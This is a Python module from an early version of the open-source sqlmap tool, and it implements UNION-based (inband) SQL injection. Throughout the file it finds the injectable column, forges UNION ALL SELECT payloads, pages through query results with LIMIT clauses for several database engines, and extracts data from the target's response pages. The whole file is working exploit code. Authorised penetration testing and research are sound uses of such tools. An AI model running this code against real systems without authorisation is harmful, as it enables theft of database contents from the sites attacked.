#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re
import time

from lib.core.agent import agent
from lib.core.common import parseUnionPage
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.data import temp
from lib.core.exception import sqlmapUnsupportedDBMSException
from lib.core.session import setUnion
from lib.core.unescaper import unescaper
from lib.parse.html import htmlParser
from lib.request.connect import Connect as Request
from lib.techniques.inband.union.test import unionTest
from lib.utils.resume import resume


reqCount   = 0


def __unionPosition(expression, negative=False):
    global reqCount

    if negative:
        negLogMsg = "partial"
    else:
        negLogMsg = "full"

    infoMsg  = "confirming %s inband sql injection on parameter " % negLogMsg
    infoMsg += "'%s'" % kb.injParameter
    logger.info(infoMsg)

    # For each column of the table (# of NULL) perform a request using
    # the UNION ALL SELECT statement to test it the target url is
    # affected by an exploitable inband SQL injection vulnerability
    for exprPosition in range(0, kb.unionCount):
        # Prepare expression with delimiters
        randQuery = randomStr()
        randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
        randQueryUnescaped = unescaper.unescape(randQueryProcessed)

        if len(randQueryUnescaped) > len(expression):
            blankCount = len(randQueryUnescaped) - len(expression)
            expression = (" " * blankCount) + expression
        elif len(randQueryUnescaped) < len(expression):
            blankCount = len(expression) - len(randQueryUnescaped)
            randQueryUnescaped = (" " * blankCount) + randQueryUnescaped

        # Forge the inband SQL injection request
        query = agent.forgeInbandQuery(randQueryUnescaped, exprPosition)
        payload = agent.payload(newValue=query, negative=negative)

        # Perform the request
        resultPage, _ = Request.queryPage(payload, content=True)
        reqCount += 1

        # We have to assure that the randQuery value is not within the
        # HTML code of the result page because, for instance, it is there
        # when the query is wrong and the back-end DBMS is Microsoft SQL
        # server
        htmlParsed = htmlParser(resultPage)

        if randQuery in resultPage and not htmlParsed:
            setUnion(position=exprPosition)

            break

    if isinstance(kb.unionPosition, int):
        infoMsg  = "the target url is affected by an exploitable "
        infoMsg += "%s inband sql injection vulnerability" % negLogMsg
        logger.info(infoMsg)
    else:
        warnMsg  = "the target url is not affected by an exploitable "
        warnMsg += "%s inband sql injection vulnerability" % negLogMsg

        if negLogMsg == "partial":
            warnMsg += ", sqlmap will retrieve the query output "
            warnMsg += "through blind sql injection technique"

        logger.warn(warnMsg)


def unionUse(expression, direct=False, unescape=True, resetCounter=False):
    """
    This function tests for an inband SQL injection on the target
    url then call its subsidiary function to effectively perform an
    inband SQL injection on the affected url
    """

    count      = None
    origExpr   = expression
    start      = time.time()
    startLimit = 0
    stopLimit  = None
    test       = True
    value      = ""

    global reqCount

    if resetCounter == True:
        reqCount = 0

    if not kb.unionCount:
        unionTest()

    if not kb.unionCount:
        return

    # Prepare expression with delimiters
    if unescape:
        expression = agent.concatQuery(expression)
        expression = unescaper.unescape(expression)

    # Confirm the inband SQL injection and get the exact column
    # position only once
    if not isinstance(kb.unionPosition, int):
        __unionPosition(expression)

        # Assure that the above function found the exploitable full inband
        # SQL injection position
        if not isinstance(kb.unionPosition, int):
            __unionPosition(expression, True)

            # Assure that the above function found the exploitable partial
            # inband SQL injection position
            if not isinstance(kb.unionPosition, int):
                return
            else:
                conf.paramNegative = True

    if conf.paramNegative == True and direct == False:
        _, _, _, _, expressionFieldsList, expressionFields = agent.getFields(origExpr)

        if len(expressionFieldsList) > 1:
            infoMsg  = "the SQL query provided has more than a field. "
            infoMsg += "sqlmap will now unpack it into distinct queries "
            infoMsg += "to be able to retrieve the output even if we "
            infoMsg += "are in front of a partial inband sql injection"
            logger.info(infoMsg)

        # We have to check if the SQL query might return multiple entries
        # and in such case forge the SQL limiting the query output one
        # entry per time
        # NOTE: I assume that only queries that get data from a table can
        # return multiple entries
        if " FROM " in expression:
            limitRegExp = re.search(queries[kb.dbms].limitregexp, expression, re.I)

            if limitRegExp:
                if kb.dbms in ( "MySQL", "PostgreSQL" ):
                    limitGroupStart = queries[kb.dbms].limitgroupstart
                    limitGroupStop  = queries[kb.dbms].limitgroupstop

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1

                elif kb.dbms == "Microsoft SQL Server":
                    limitGroupStart = queries[kb.dbms].limitgroupstart
                    limitGroupStop  = queries[kb.dbms].limitgroupstop

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1

                elif kb.dbms == "Oracle":
                    limitCond = False
            else:
                limitCond = True

            # I assume that only queries NOT containing a "LIMIT #, 1"
            # (or similar depending on the back-end DBMS) can return
            # multiple entries
            if limitCond:
                if limitRegExp:
                    stopLimit = int(stopLimit)

                    # From now on we need only the expression until the " LIMIT "
                    # (or similar, depending on the back-end DBMS) word
                    if kb.dbms in ( "MySQL", "PostgreSQL" ):
                        stopLimit += startLimit
                        untilLimitChar = expression.index(queries[kb.dbms].limitstring)
                        expression = expression[:untilLimitChar]

                    elif kb.dbms == "Microsoft SQL Server":
                        stopLimit += startLimit

                if not stopLimit or stopLimit <= 1:
                    if kb.dbms == "Oracle" and expression.endswith("FROM DUAL"):
                        test = False
                    else:
                        test = True

                if test == True:
                    # Count the number of SQL query entries output
                    countFirstField   = queries[kb.dbms].count % expressionFieldsList[0]
                    countedExpression = origExpr.replace(expressionFields, countFirstField, 1)

                    if re.search(" ORDER BY ", expression, re.I):
                        untilOrderChar = countedExpression.index(" ORDER BY ")
                        countedExpression = countedExpression[:untilOrderChar]

                    count = resume(countedExpression, None)

                    if not stopLimit:
                        if not count or not count.isdigit():
                            output = unionUse(countedExpression, direct=True)

                            if output:
                                count = parseUnionPage(output, countedExpression)

                        if count and count.isdigit() and int(count) > 0:
                            stopLimit = int(count)

                            infoMsg  = "the SQL query provided returns "
                            infoMsg += "%d entries" % stopLimit
                            logger.info(infoMsg)

                        elif count and not count.isdigit():
                            warnMsg  = "it was not possible to count the number "
                            warnMsg += "of entries for the SQL query provided. "
                            warnMsg += "sqlmap will assume that it returns only "
                            warnMsg += "one entry"
                            logger.warn(warnMsg)

                            stopLimit = 1

                        elif ( not count or int(count) == 0 ):
                            warnMsg  = "the SQL query provided does not "
                            warnMsg += "return any output"
                            logger.warn(warnMsg)

                            return

                    elif ( not count or int(count) == 0 ) and ( not stopLimit or stopLimit == 0 ):
                        warnMsg  = "the SQL query provided does not "
                        warnMsg += "return any output"
                        logger.warn(warnMsg)

                        return

                    for num in xrange(startLimit, stopLimit):
                        if kb.dbms == "Microsoft SQL Server":
                            orderBy = re.search(" ORDER BY ([\w\_]+)", expression, re.I)

                            if orderBy:
                                field = orderBy.group(1)
                            else:
                                field = expressionFieldsList[0]

                        elif kb.dbms == "Oracle":
                                field = expressionFieldsList

                        else:
                            field = None

                        limitedExpr = agent.limitQuery(num, expression, field)
                        output      = unionUse(limitedExpr, direct=True, unescape=False)

                        if output:
                            value += output

                    return value

        value = unionUse(expression, direct=True, unescape=False)

    else:
        # Forge the inband SQL injection request
        query   = agent.forgeInbandQuery(expression)
        payload = agent.payload(newValue=query)

        infoMsg = "query: %s" % query
        logger.info(infoMsg)

        # Perform the request
        resultPage, _ = Request.queryPage(payload, content=True)
        reqCount += 1

        if temp.start not in resultPage or temp.stop not in resultPage:
            return

        # Parse the returned page to get the exact inband
        # sql injection output
        startPosition = resultPage.index(temp.start)
        endPosition = resultPage.rindex(temp.stop) + len(temp.stop)
        value = str(resultPage[startPosition:endPosition])

        duration = int(time.time() - start)

        infoMsg = "performed %d queries in %d seconds" % (reqCount, duration)
        logger.info(infoMsg)

    return value
